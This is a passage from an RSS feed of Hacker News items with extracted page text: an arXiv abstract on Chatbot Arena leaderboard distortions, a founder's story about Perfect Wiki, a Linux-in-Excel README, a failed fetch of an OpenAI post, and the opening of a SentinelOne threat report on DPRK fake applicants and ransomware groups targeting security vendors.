            <description><![CDATA[<p>URL: <a href="https://arxiv.org/abs/2504.20879">https://arxiv.org/abs/2504.20879</a>, See on <a href="https://news.ycombinator.com/item?id=43842380">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="content-inner">
    
    
    <div><p><span>Authors:</span><a href="https://arxiv.org/search/cs?searchtype=author&amp;query=Singh,+S" rel="nofollow">Shivalika Singh</a>, <a href="https://arxiv.org/search/cs?searchtype=author&amp;query=Nan,+Y" rel="nofollow">Yiyang Nan</a>, <a href="https://arxiv.org/search/cs?searchtype=author&amp;query=Wang,+A" rel="nofollow">Alex Wang</a>, <a href="https://arxiv.org/search/cs?searchtype=author&amp;query=D%27Souza,+D" rel="nofollow">Daniel D'Souza</a>, <a href="https://arxiv.org/search/cs?searchtype=author&amp;query=Kapoor,+S" rel="nofollow">Sayash Kapoor</a>, <a href="https://arxiv.org/search/cs?searchtype=author&amp;query=%C3%9Cst%C3%BCn,+A" rel="nofollow">Ahmet Üstün</a>, <a href="https://arxiv.org/search/cs?searchtype=author&amp;query=Koyejo,+S" rel="nofollow">Sanmi Koyejo</a>, <a href="https://arxiv.org/search/cs?searchtype=author&amp;query=Deng,+Y" rel="nofollow">Yuntian Deng</a>, <a href="https://arxiv.org/search/cs?searchtype=author&amp;query=Longpre,+S" rel="nofollow">Shayne Longpre</a>, <a href="https://arxiv.org/search/cs?searchtype=author&amp;query=Smith,+N" rel="nofollow">Noah Smith</a>, <a href="https://arxiv.org/search/cs?searchtype=author&amp;query=Ermis,+B" rel="nofollow">Beyza Ermis</a>, <a href="https://arxiv.org/search/cs?searchtype=author&amp;query=Fadaee,+M" rel="nofollow">Marzieh Fadaee</a>, <a href="https://arxiv.org/search/cs?searchtype=author&amp;query=Hooker,+S" rel="nofollow">Sara Hooker</a></p></div>            
    <p><a href="https://arxiv.org/pdf/2504.20879">View PDF</a>
    <a href="https://arxiv.org/html/2504.20879v1">HTML (experimental)</a></p><blockquote>
            <span>Abstract:</span>Measuring progress is fundamental to the advancement of any scientific field. As benchmarks play an increasingly central role, they also grow more susceptible to distortion. Chatbot Arena has emerged as the go-to leaderboard for ranking the most capable AI systems. Yet, in this work we identify systematic issues that have resulted in a distorted playing field. We find that undisclosed private testing practices benefit a handful of providers who are able to test multiple variants before public release and retract scores if desired. We establish that the ability of these providers to choose the best score leads to biased Arena scores due to selective disclosure of performance results. At an extreme, we identify 27 private LLM variants tested by Meta in the lead-up to the Llama-4 release. We also establish that proprietary closed models are sampled at higher rates (number of battles) and have fewer models removed from the arena than open-weight and open-source alternatives. Both these policies lead to large data access asymmetries over time. Providers like Google and OpenAI have received an estimated 19.2% and 20.4% of all data on the arena, respectively. In contrast, a combined 83 open-weight models have only received an estimated 29.7% of the total data. We show that access to Chatbot Arena data yields substantial benefits; even limited additional data can result in relative performance gains of up to 112% on the arena distribution, based on our conservative estimates. Together, these dynamics result in overfitting to Arena-specific dynamics rather than general model quality. The Arena builds on the substantial efforts of both the organizers and an open community that maintains this valuable evaluation platform. We offer actionable recommendations to reform the Chatbot Arena's evaluation framework and promote fairer, more transparent benchmarking for the field
    </blockquote>

    <!--CONTEXT-->
    
  </div><div>
      <h2>Submission history</h2><p> From: Marzieh Fadaee [<a href="https://arxiv.org/show-email/57dd04f2/2504.20879" rel="nofollow">view email</a>]      <br>    <strong>[v1]</strong>
        Tue, 29 Apr 2025 15:48:49 UTC (854 KB)<br>
</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[I created Perfect Wiki and reached $250k in annual revenue without investors (547 pts)]]></title>
            <link>https://habr.com/en/articles/905812/</link>
            <guid>43842306</guid>
            <pubDate>Wed, 30 Apr 2025 07:45:51 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://habr.com/en/articles/905812/">https://habr.com/en/articles/905812/</a>, See on <a href="https://news.ycombinator.com/item?id=43842306">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-test-id="articleStats"><p><span><svg height="24" width="24"><title>Level of difficulty</title><use xlink:href="/img/megazord-v28.7909a852..svg#complexity-low"></use></svg></span><span>Easy</span></p><p><span><svg height="24" width="24"><title>Reading time</title><use xlink:href="/img/megazord-v28.7909a852..svg#clock"></use></svg></span><span>6 min</span></p><p><span><svg height="24" width="24"><title>Views</title><use xlink:href="/img/megazord-v28.7909a852..svg#counter-views"></use></svg><span title="11423">11K</span></span></p></div><div xmlns="http://www.w3.org/1999/xhtml" id="post-content-body" data-gallery-root="" lang="en"><p>Hi, my name is Ilia. I founded&nbsp;<a href="https://perfectwiki.com/" rel="noopener noreferrer nofollow"><strong>Perfect Wiki</strong></a>&nbsp;— a SaaS product for creating internal company knowledge bases that works directly within Microsoft Teams. We created a simple and convenient tool for storing, editing, and sharing knowledge within companies. It all started with the idea to resolve one specific pain point: the built-in Wiki in Microsoft Teams offered was inconvenient, and there was no worthy alternatives with full integration to the platform.</p><p>In this article, I want to share how the idea came about, the mistakes I made, how I found my first customers, and how I gradually grew to a steady income of $250,000 a year over five years. All of this — without investors, a 20-person team, or a “Series A” round.</p><h4>How It All Began</h4><p>In May 2020, I lost my job and started thinking about new projects to launch or where to direct my efforts. The pandemic drastically changed the market: the mass transition to remote work boosted interest in online communication tools, and everyone wanted to launch their own video conferencing service. It felt like a gold rush, and I decided to follow the principle: in such times, those who sell shovels win, not those who search for gold.</p><figure><img src="https://habrastorage.org/r/w1560/getpro/habr/upload_files/b63/cf9/4a1/b63cf94a17709c08bdad4324498ae31d.png" width="2076" height="2006" sizes="(max-width: 780px) 100vw, 50vw" srcset="https://habrastorage.org/r/w780/getpro/habr/upload_files/b63/cf9/4a1/b63cf94a17709c08bdad4324498ae31d.png 780w,
       https://habrastorage.org/r/w1560/getpro/habr/upload_files/b63/cf9/4a1/b63cf94a17709c08bdad4324498ae31d.png 781w" loading="lazy" decode="async"></figure><p>Zoom became hugely popular during the pandemic. I decided to try making a small app — a translator — and published it on the Zoom Marketplace. But it turned out people were only interested in the Zoom app itself, and the marketplace had almost no traffic.</p><p>After that failure, I moved on to Plan B: I tried publishing the translator app on the&nbsp;<strong>Microsoft Teams Marketplace</strong>. It seemed like there were significantly more users, apps there had lots of ratings and installs. The platform felt “alive.” My intuition didn’t fail me — just a few days after publishing, someone bought a paid subscription. But I soon realized the translator app was very limited with no room for growth. Microsoft could easily replace it anytime.</p><p>That’s when I decided to dive deeper into analyzing what other problems Microsoft Teams users were facing and what kind of service I could offer them. I was confident I’d find a niche because the traffic and activity on the marketplace were high — a ready-made customer base was just in front of me. I just needed to find a product idea that would solve a real problem.</p><p>I started reading forums, comments, and online discussions. It turned out the built-in Wiki in Microsoft Teams annoyed users really a lot. It was slow and inconvenient. That’s how the idea came about — I had to create a fast, user-friendly knowledge base built directly into Microsoft Teams. The main goal was to make it simple and intuitive for people who weren’t tech-savvy — just regular PC users.</p><h4>I Got My First Paying Customer Just a Few Days After Launch</h4><p>I created and published the first version of the product in a fairly short time — it took me about three weeks. It already had page creation and editing features, and most importantly,&nbsp;<strong>full-text search</strong>&nbsp;(a much-requested feature the users lacked in the built-in Wiki).</p><p>I used technologies and tools I was already very well familiar with:&nbsp;<strong>Node.js + Express</strong>&nbsp;for the backend and&nbsp;<strong>React</strong>&nbsp;for the frontend.</p><figure><img src="https://habrastorage.org/r/w1560/getpro/habr/upload_files/a95/c9d/de4/a95c9dde4a549ed2832864821744bf0a.png" width="1758" height="738" sizes="(max-width: 780px) 100vw, 50vw" srcset="https://habrastorage.org/r/w780/getpro/habr/upload_files/a95/c9d/de4/a95c9dde4a549ed2832864821744bf0a.png 780w,
       https://habrastorage.org/r/w1560/getpro/habr/upload_files/a95/c9d/de4/a95c9dde4a549ed2832864821744bf0a.png 781w" loading="lazy" decode="async"></figure><p>Just a couple of days after publishing&nbsp;<strong>Perfect Wiki</strong>&nbsp;on the Microsoft Teams Marketplace, I got my first paying user. My assumptions were confirmed — people were actively looking for an alternative to the built-in Wiki, and they searched for it directly in the Teams marketplace. They found my app using the keyword “wiki.” It was an awesome free acquisition channel. Perfect Wiki was always the top search result because there were no competitors. That’s when I realized I had found a real pain point &nbsp;— and I could make money by solving it.</p><h4>Perfect Wiki Is Now Used by Over 500 Companies</h4><p>Today, over&nbsp;<strong>500 companies around the world</strong>&nbsp;use Perfect Wiki. Our main markets are&nbsp;<strong>the</strong>&nbsp;<strong>US, Canada, the UK, and Germany</strong>.</p><p>Over five years, the product has grown significantly. Revenue is now about&nbsp;<strong>$250,000 a year</strong>. However, it wasn’t always smooth sailing — there were months with no growth, times when everything felt stuck. We had to change plans, improve the product, and look for new ideas.</p><p>In 2024, Microsoft even featured us at&nbsp;<strong>Microsoft Build</strong>&nbsp;as an example of an app that’s top-rated and highly valued among Teams users and the one the really works — a big milestone for us.</p><figure><img src="https://habrastorage.org/r/w1560/getpro/habr/upload_files/8ce/719/199/8ce719199ec41cc4f6e911b06234b852.png" width="1100" height="582" sizes="(max-width: 780px) 100vw, 50vw" srcset="https://habrastorage.org/r/w780/getpro/habr/upload_files/8ce/719/199/8ce719199ec41cc4f6e911b06234b852.png 780w,
       https://habrastorage.org/r/w1560/getpro/habr/upload_files/8ce/719/199/8ce719199ec41cc4f6e911b06234b852.png 781w" loading="lazy" decode="async"></figure><h4>Why Do People Choose Us?</h4><p>Many of our clients came to us after trying the Microsoft built-in Wiki. It was clunky, inconvenient, and didn’t do the job well. We focused on simplicity: the essential features only, nothing extra — and everything should function&nbsp;<strong>inside Microsoft Teams</strong>.</p><p>Integration with Microsoft Teams is the key. Unlike other knowledge base platforms, Perfect Wiki doesn’t require switching to a separate site or tab. It’s available right where employees already spend most of their day — in Microsoft Teams. It saves time, doesn't add any difficulties, and makes working with a knowledge base a natural part of the workflow.</p><p>Microsoft tried to address this issue via products like Viva and Loop, but they turned out to be too bulky and confusing. Competitors like Confluence or Notion just aren’t integrated into Teams in a way that’s convenient for users.</p><p>Perfect Wiki was built&nbsp;<strong>specifically for Microsoft Teams</strong>&nbsp;— and that’s been our main advantage from day one.</p><h4>Only Two People Work on the Project</h4><p>Currently, the team behind Perfect Wiki is just&nbsp;<strong>two people</strong>. I handle the development and product, and my colleague manages user support. Despite having a tiny team, we manage to achieve a lot: we launch new features quickly, communicate with customers, test ideas, and maintain stable service.</p><p>We outsource some marketing and content tasks, but everything related to the product and code we do ourselves.</p><p>Sometimes we bring in new people if we feel it's time to grow. Right now is one of those moments: if you’re an experienced developer familiar with Node.js + Express + React — send us your CV at&nbsp;<a href="mailto:hello@perfectwiki.com" rel="noopener noreferrer nofollow">hello@perfectwiki.com</a>&nbsp;</p><h4>How We Understand What Customers Need</h4><p>It all starts with communication. We have an internal app chat — people regularly send us questions, suggestions, and feedback. We also do demo calls, discuss use-case scenarios, and every quarter, we reach out to active loyal users asking for feature and improvement ideas. This helps us to deeply understand user needs.</p><p>We don’t implement features just because they&nbsp;<em>seem</em>&nbsp;useful. Every new functionality in Perfect Wiki must be genuinely requested and needed by users. For example, I wasn’t sure whether a “search within a page” was necessary. But after several complaints about documents getting longer, and Ctrl+F not working in Teams — it became clear the feature was needed.</p><p>Another example: users suggested a&nbsp;<strong>weekly digest</strong>&nbsp;with a list of new or updated knowledge base articles. They wanted to stay in the loop about changes.</p><p>That’s how we improve the product — not by simple guessing, but in collaboration with our users.</p><p>And we actually use&nbsp;<strong>Perfect Wiki ourselves</strong>&nbsp;— that helps us spot areas for changes and growth. All our internal documentation, tasks, and plans are stored in Perfect Wiki. Even our public Help Center runs on our platform. This way, we test the product in real use and quickly notice what needs fixing or tweaking.</p><p>Every time I check out competitors' sites — those who also build knowledge base or customer support platforms — I notice something odd. Almost all of them use third-party tools like Intercom or Zendesk to support their own customers. That surprises me. If your product is so great — why don’t you use it yourself? For me, that’s a golden rule: your product should be so good you&nbsp;<em>want</em>&nbsp;to use it yourself. If not, that means something’s wrong.</p><figure><img src="https://habrastorage.org/r/w1560/getpro/habr/upload_files/0db/c7d/cb5/0dbc7dcb52758aceffc1f34bfa751e87.png" width="2286" height="1916" sizes="(max-width: 780px) 100vw, 50vw" srcset="https://habrastorage.org/r/w780/getpro/habr/upload_files/0db/c7d/cb5/0dbc7dcb52758aceffc1f34bfa751e87.png 780w,
       https://habrastorage.org/r/w1560/getpro/habr/upload_files/0db/c7d/cb5/0dbc7dcb52758aceffc1f34bfa751e87.png 781w" loading="lazy" decode="async"></figure><h4>A Bit About Money</h4><figure><img src="https://habrastorage.org/r/w1560/getpro/habr/upload_files/05d/566/8e5/05d5668e57c37483479ea293de9d2958.png" width="1979" height="1180" sizes="(max-width: 780px) 100vw, 50vw" srcset="https://habrastorage.org/r/w780/getpro/habr/upload_files/05d/566/8e5/05d5668e57c37483479ea293de9d2958.png 780w,
       https://habrastorage.org/r/w1560/getpro/habr/upload_files/05d/566/8e5/05d5668e57c37483479ea293de9d2958.png 781w" loading="lazy" decode="async"></figure><p>Right now, I earn around&nbsp;<strong>$25,000 per month</strong>. My monthly expenses are pretty modest:</p><ul><li><p>$500–$1000 on&nbsp;<strong>Google Cloud</strong></p></li><li><p>$400–$500 on&nbsp;<strong>Algolia</strong></p></li><li><p>&lt;$350 on&nbsp;<strong>other SaaS tools</strong></p></li><li><p>&lt;$500 on&nbsp;<strong>contractors</strong></p></li></ul><p>Everything else is my profit.</p><h4>What I’ve Learned Over the Years</h4><p>The most important rule:&nbsp;<strong>don’t be afraid to build niche products for a narrow audience</strong>. It’s vital to create something that solves a specific problem really well.</p><p>Second lesson I learned:&nbsp;<strong>simplicity wins</strong>. The simpler and more understandable your product, the easier it is to sell and maintain. When you have a small team and limited resources, simplicity isn’t a luxury — it’s a necessity. It keeps you from drowning in features, endless requests, and tech debt.</p><h4>Did I Expect This?</h4><p>Honestly? I didn’t have big ambitions. I just wanted to earn a stable&nbsp;<strong>$70–80K a year</strong>&nbsp;— about what I earned at my previous job. Everything beyond that has been a pleasant bonus. Perfect Wiki has grown more than I ever expected. All without investments, offices, or a big team. Just because the product was in demand — and we kept making it better, step by step.</p><h4>What’s Next?</h4><p>Perfect Wiki has already become more than just an add-on to Microsoft Teams. Now it can also be used in&nbsp;<strong>Slack</strong>, via&nbsp;<strong>ChatGPT</strong>, or as a&nbsp;<strong>chatbot on your website</strong>. You can even create a&nbsp;<strong>public support portal</strong>&nbsp;for your customers — our Help Center is a prime example.</p><p>We’re constantly adding new integrations, improving search, and most importantly — always listening to our users. The best is still ahead!</p><p><strong>P.S.</strong>&nbsp;If you’re curious to follow our product journey, I have a <a href="https://t.me/teams_development" rel="noopener noreferrer nofollow">Telegram channel</a> and <a href="https://x.com/ilia_pir" rel="noopener noreferrer nofollow">Twitter</a>.</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Linux in Excel (169 pts)]]></title>
            <link>https://github.com/NSG650/LinuxInExcel</link>
            <guid>43840861</guid>
            <pubDate>Wed, 30 Apr 2025 03:08:46 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/NSG650/LinuxInExcel">https://github.com/NSG650/LinuxInExcel</a>, See on <a href="https://news.ycombinator.com/item?id=43840861">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-hpc="true"><article itemprop="text"><p dir="auto"><h2 tabindex="-1" dir="auto">Linux In Excel</h2><a id="user-content-linux-in-excel" aria-label="Permalink: Linux In Excel" href="#linux-in-excel"></a></p>
<p dir="auto">Linux running in Excel
<a target="_blank" rel="noopener noreferrer" href="https://private-user-images.githubusercontent.com/51860844/439115788-321199ec-0191-4296-815e-8da17d9454a8.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NDYwMTY1MDMsIm5iZiI6MTc0NjAxNjIwMywicGF0aCI6Ii81MTg2MDg0NC80MzkxMTU3ODgtMzIxMTk5ZWMtMDE5MS00Mjk2LTgxNWUtOGRhMTdkOTQ1NGE4LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTA0MzAlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwNDMwVDEyMzAwM1omWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWQ5ZmY2ZDAwZTFmOGZmOTM5ZDQyZmE1Yzg5YWIwNjcxMWNjMDYxYmQwMDYzYTAwYmRiOTk5ZmExYWYwOGNhMjUmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.zthuqIp-uSwyvoxKHGYkIi5C6uyi3YDww18PKZ8HSPk"><img src="https://private-user-images.githubusercontent.com/51860844/439115788-321199ec-0191-4296-815e-8da17d9454a8.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NDYwMTY1MDMsIm5iZiI6MTc0NjAxNjIwMywicGF0aCI6Ii81MTg2MDg0NC80MzkxMTU3ODgtMzIxMTk5ZWMtMDE5MS00Mjk2LTgxNWUtOGRhMTdkOTQ1NGE4LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTA0MzAlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwNDMwVDEyMzAwM1omWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWQ5ZmY2ZDAwZTFmOGZmOTM5ZDQyZmE1Yzg5YWIwNjcxMWNjMDYxYmQwMDYzYTAwYmRiOTk5ZmExYWYwOGNhMjUmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.zthuqIp-uSwyvoxKHGYkIi5C6uyi3YDww18PKZ8HSPk" alt="image"></a></p>
<p dir="auto"><h2 tabindex="-1" dir="auto">How?</h2><a id="user-content-how" aria-label="Permalink: How?" href="#how"></a></p>
<p dir="auto">It makes use of <a href="https://github.com/cnlohr/mini-rv32ima">mini-rv32ima</a>.
The emulator is built as a seperate dll which is loaded by the VBA macro. The VBA macro calls the emulator in the dll and gets the output and writes it into the cells in the spreadsheet.
The thing is evidently very buggy but I did not want to spend a lot of time on it. This was done mostly for fun. Evidently this was cheating since I did not rewrite the emulator in VBA or Excel formulas but again I wanted to run Linux in Excel and this was one way to do so.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Building and Running</h2><a id="user-content-building-and-running" aria-label="Permalink: Building and Running" href="#building-and-running"></a></p>
<p dir="auto">I was using MSVC to build the dll.
Use the following command</p>
<div data-snippet-clipboard-copy-content="cl dllmain.c /LD /Fefun.dll"><pre><code>cl dllmain.c /LD /Fefun.dll
</code></pre></div>
<p dir="auto">Then in the Excel file change the path to the dll.
You can pass in input by writing the text in the C2 cell. (Thank you Endermanch for adding support for this!)</p>
</article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Sycophancy in GPT-4o (470 pts)]]></title>
            <link>https://openai.com/index/sycophancy-in-gpt-4o/</link>
            <guid>43840842</guid>
            <pubDate>Wed, 30 Apr 2025 03:06:26 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://openai.com/index/sycophancy-in-gpt-4o/">https://openai.com/index/sycophancy-in-gpt-4o/</a>, See on <a href="https://news.ycombinator.com/item?id=43840842">Hacker News</a></p>
Couldn't get https://openai.com/index/sycophancy-in-gpt-4o/: Error: Request failed with status code 403]]></description>
        </item>
        <item>
            <title><![CDATA[What It Takes to Defend a Cybersecurity Company from Today's Adversaries (161 pts)]]></title>
            <link>https://www.sentinelone.com/labs/top-tier-target-what-it-takes-to-defend-a-cybersecurity-company-from-todays-adversaries/</link>
            <guid>43840763</guid>
            <pubDate>Wed, 30 Apr 2025 02:53:02 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.sentinelone.com/labs/top-tier-target-what-it-takes-to-defend-a-cybersecurity-company-from-todays-adversaries/">https://www.sentinelone.com/labs/top-tier-target-what-it-takes-to-defend-a-cybersecurity-company-from-todays-adversaries/</a>, See on <a href="https://news.ycombinator.com/item?id=43840763">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
										<h2>Executive Summary</h2>
<ul>
<li aria-level="1">In recent months, SentinelOne has observed and defended against a spectrum of attacks from financially motivated crimeware to tailored campaigns by advanced nation-state actors.</li>
<li aria-level="1">These incidents were real intrusion attempts against a U.S.-based cybersecurity company by adversaries, but incidents such as these are neither new nor unique to SentinelOne.</li>
<li aria-level="1">Recent adversaries have included:
<ul>
<li aria-level="2">DPRK IT workers posing as job applicants</li>
<li aria-level="2">ransomware operators probing for ways to access/abuse our platform</li>
<li aria-level="2">Chinese state-sponsored actors targeting organizations aligned with our business and customer base</li>
</ul>
</li>
<li aria-level="1">This report highlights a rarely-discussed but crucially important attack surface: security vendors themselves.</li>
</ul>
<h2>Overview</h2>
<p>At SentinelOne, defending against real-world threats isn’t just part of the job, it’s the reality of operating as a cybersecurity company in today’s landscape. We don’t just study attacks, we experience them firsthand, levied against us. Our teams face the same threats we help others prepare for, and that proximity to the front lines shapes how we think, and how we operate. Real-world attacks against our own environment serve as constant pressure tests, reinforcing what works, revealing what doesn’t, and driving continuous improvement across our products and operations. When you’re a high-value target for some of the most capable and persistent adversaries out there, nothing less will do.</p>
<p>Talking about being targeted is uncomfortable for any organization. For cybersecurity vendors, it’s practically taboo. But the truth is security vendors sit at an interesting cross-section of access, responsibility, and attacker ire that makes us prime targets for a variety of threat actors, and the stakes couldn’t be higher. When adversaries compromise a security company, they don’t just breach a single environment—they potentially gain insight into how thousands of environments and millions of endpoints are protected.</p>
<p>In the past several months alone, we’ve observed and defended against a spectrum of attacks ranging from financially motivated crimeware to tailored campaigns by advanced nation-state actors. They were real intrusion attempts targeting a U.S.-based cybersecurity company — launched by adversaries actively looking for an advantage, access, or leverage. Adversaries included DPRK IT workers posing as job applicants, ransomware operators probing for ways to access/abuse our platform, and Chinese state-sponsored actors targeting organizations aligned with our business and customer base.</p>
<p>We are certainly not the only ones facing these threats. In the spirit of furthering collective defenses and encouraging further collaboration, we’re pulling back the curtain to share some of what we’ve seen, why it matters, and what it tells us about the evolving threat landscape—not just for us, but for every company building and relying on modern security technology.</p>
<h2>DPRK IT Workers Seeking Inside Jobs</h2>
<p>One of the more prolific and persistent adversary campaigns we’ve tracked in recent years involves widespread campaigns by DPRK-affiliated IT Workers attempting to secure remote employment within Western tech companies– including SentinelOne. <a href="https://www.justice.gov/archives/opa/pr/fourteen-north-korean-nationals-indicted-carrying-out-multi-year-fraudulent-information" target="_blank" rel="noopener noreferrer">Early reports</a> drew attention to these efforts and <a href="https://www.sentinelone.com/labs/dprk-it-workers-a-network-of-active-front-companies-and-their-links-to-china/" target="_blank" rel="noopener noreferrer">our own analysis</a> revealed further logistical infrastructure to launder illicit funds via Chinese intermediary organizations. However, neither gave a sense of the staggering volume of ongoing infiltration attempts. This vector far outpaces any other insider threat vector we monitor.</p>
<p>These actors are not just applying blindly — they are refining their process, leveraging stolen or fabricated personas, and adapting their outreach tactics to mirror legitimate job seekers in increasingly convincing ways. Our team has tracked roughly 360 fake personas and over 1,000 job applications linked to DPRK IT worker operations applying for roles at SentinelOne — even including brazen attempts to secure positions on the SentinelLabs intelligence engineering team itself.</p>
<figure id="attachment_120051" aria-describedby="caption-attachment-120051"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_1.jpg" alt="Public reporting of DPRK IT workers applying to threat intelligence positions" width="588" height="723" srcset="https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_1.jpg 588w, https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_1-244x300.jpg 244w" sizes="auto, (max-width: 588px) 100vw, 588px"><figcaption id="caption-attachment-120051">Public reporting of DPRK IT workers applying to threat intelligence positions</figcaption></figure>
<h3>Engagement and Adversary Interaction</h3>
<p>Instead of staying passive, we made a deliberate choice towards intelligence-driven engagement. In coordination with our talent acquisition teams, we developed workflows to identify and interact with suspected DPRK applicants during the early phases of their outreach. This collaboration was key. By embedding lightweight vetting signals and monitoring directly into recruiting processes — without overburdening hiring teams — we were able to surface anomalous patterns tied to DPRK-affiliated personas piped directly into our Vertex Synapse intelligence platform for analyst review.</p>
<p>Our attempted interactions offered rare insights into the craftiness and persistence of these infiltration campaigns — particularly the ways in which adversaries adapt to the friction they encounter.</p>
<figure id="attachment_120055" aria-describedby="caption-attachment-120055"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_6.jpg" alt="Inbound DPRK referral request to strategic employees" width="1908" height="378" srcset="https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_6.jpg 1908w, https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_6-300x59.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_6-1024x203.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_6-768x152.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_6-1536x304.jpg 1536w" sizes="auto, (max-width: 1908px) 100vw, 1908px"><figcaption id="caption-attachment-120055">Inbound DPRK referral request to strategic employees</figcaption></figure>
<p>The attackers are honing their craft beyond the job application and recruitment process. An operation of this scale and nature requires a different kind of backend infrastructure, such as a<a href="https://www.sentinelone.com/labs/dprk-it-workers-a-network-of-active-front-companies-and-their-links-to-china/" target="_blank" rel="noopener noreferrer"> sprawling network of front companies</a> to enable further laundering and logistics.</p>
<figure id="attachment_120057" aria-describedby="caption-attachment-120057"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_8.jpg" alt="DPRK IT Worker Front Company Network (November 2024)" width="2000" height="1037" srcset="https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_8.jpg 2000w, https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_8-300x156.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_8-1024x531.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_8-768x398.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_8-1536x796.jpg 1536w" sizes="auto, (max-width: 2000px) 100vw, 2000px"><figcaption id="caption-attachment-120057">DPRK IT Worker Front Company Network (November 2024)</figcaption></figure>
<h3>Helping Hiring Teams Help Us</h3>
<p>A key takeaway in working on this investigation was the value of intentionally creating inroads and sharing threat context with different teams not normally keyed into investigations. Rather than cluelessness, we encountered an intuitive understanding of the situation as recruiters had already been filtering out and reporting ‘fake applicants’ within their own processes.</p>
<p>We brought campaign-level understanding that was combined with tactical insights from our talent team. The payoff was immediate. Recruiters began spotting patterns on their own, driving an increase in early-stage escalation of suspicious profiles. They became an active partner that continues to flag new sightings from the frontlines. In turn, we are codifying these insights into automated systems that flag, filter, enrich, and proactively block these campaigns to lower the burden on our recruiters and hiring managers, and reduce the risk of infiltration.</p>
<p>Make cross‑functional collaboration standard operating procedure: equip frontline business units—from recruiting to sales—with shared threat context and clear escalation paths so they can surface anomalies early without slowing the business. Codifying insights with automation will consistently bring bi-directional benefits.</p>
<p>The DPRK IT worker threat is a uniquely complex challenge — one where meaningful progress depends on collaboration between the security research community and public sector partners.</p>
<h2>Ransomware Group Capability Development</h2>
<p>Financially motivated threat actors frequently target enterprise security platforms —products designed to keep them from making money—for direct access. SentinelOne, like our peers, is no exception. While uncomfortable, this is a reality the industry faces continually and should handle with both transparency and urgency.</p>
<figure id="attachment_120054" aria-describedby="caption-attachment-120054"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_5.jpg" alt="Forum post offering security product access" width="746" height="415" srcset="https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_5.jpg 746w, https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_5-300x167.jpg 300w" sizes="auto, (max-width: 746px) 100vw, 746px"><figcaption id="caption-attachment-120054">Forum post offering security product access</figcaption></figure>
<p>Privileged access to administrative interfaces or agent installers for endpoint security products provides tangible advantages for adversaries seeking to advance their operations. Console access can be used to disable protections, manipulate configurations, or suppress detections. Direct, unmonitored access to the endpoint agent offers opportunities to test malware efficacy, explore bypass or tampering techniques, and suppress forensic visibility critical for investigations. In the wrong hands, these capabilities represent a significant threat to both the integrity of security products and the environments they protect.</p>
<p>This isn’t a new tactic. Various high-profile criminal groups have long specialized in social engineering campaigns to gain access to core security tools and infrastructure—ranging from EDR platforms (including SentinelOne and Microsoft Defender) to IAM and VPN providers such as Okta. Their goal: expand footholds, disable defenses, and obstruct detection long enough to profit.</p>
<p>Recent leaks related to <a href="https://www.sentinelone.com/anthology/black-basta/" target="_blank" rel="noopener noreferrer">Black Basta</a> further underscore this trend. The group’s operators were observed testing across multiple endpoint security platforms—including SentinelOne, CrowdStrike, Carbon Black, and Palo Alto Networks—before launching attacks, suggesting a systematic effort to evaluate and evade security tools prior to deployment.</p>
